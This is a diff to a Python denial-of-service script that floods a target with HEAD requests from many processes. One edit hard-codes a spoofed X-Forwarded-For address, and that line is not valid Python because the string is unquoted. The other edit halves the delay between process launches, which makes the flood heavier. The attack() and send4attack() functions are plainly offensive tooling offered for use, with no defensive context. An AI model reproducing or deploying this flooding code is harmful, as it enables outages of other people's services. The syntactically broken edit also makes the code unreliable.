@@ -54,7 +54,7 @@ def randomip():
 def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"	
-  forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
+  forward = X-Forwarded-For: 50.7.198.146
   get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
@@ -91,7 +91,7 @@ def send4attack():
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() 
-    sleep(2.0)
+    sleep(1.0)
     
 send4attack()
 
